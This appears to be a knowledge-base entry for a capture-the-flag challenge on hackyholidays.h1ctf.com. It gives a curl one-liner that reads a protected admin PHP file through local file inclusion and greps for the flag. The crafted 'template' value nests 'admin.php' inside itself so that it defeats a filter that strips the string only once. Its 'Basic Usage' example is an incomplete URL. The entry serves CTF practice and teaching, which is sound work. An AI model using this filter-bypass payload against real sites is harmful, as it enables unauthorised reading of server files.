---
id: cmd-uuid-12
data: >-
  curl -s
  https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretaadmin.phpdmin.phpmin.php
  | grep flag
tags:
  - lfi
  - bypass
type: command
output: Flag HTML.
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:48.620Z'
verified: false
validated: true
submitted: true
---
# Curl Lfi Bypass Admin

## Command

```bash
curl -s https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretaadmin.phpdmin.phpmin.php | grep flag
```

## Description

Bypasses filters to read admin file and grep flag.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| template | Crafted bypass | Yes |

## Examples

### Basic Usage

```bash
curl '?template=bypass.php' | grep flag
```

## Expected Output

Flag line.

## Related

- [[procedures/Bypass-LFI-Filters-to-Read-Arbitrary-PHP-Files]]
